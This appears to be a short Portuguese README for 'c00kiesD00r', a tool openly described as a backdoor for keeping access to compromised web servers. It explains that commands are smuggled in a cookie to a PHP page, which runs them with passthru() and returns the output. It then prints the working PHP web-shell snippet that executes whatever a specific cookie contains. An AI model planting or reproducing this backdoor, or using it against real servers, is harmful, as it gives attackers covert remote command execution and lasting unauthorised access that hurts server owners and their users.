# c00kiesD00r
Cookies backdoor, aplicação utilizada para manter acesso em servidores Web.
A mesma envia requisições do tipo GET com parametros setados no User-Agent para determinada página PHP, onde a mesma faz a leitura dos cookies recebidos e passa como parâmetro para a função passthru() do PHP para que o comando seja, claro, executado no servidor. O programa faz a leitura do retorno do comando executado no servidor e exibe para usuário.

- PHP Backdoor...

      if (isset($_COOKIE['A988934']) && !empty($_COOKIE['A988934'])) {
        die(passthru($_COOKIE['A988934']));
      }
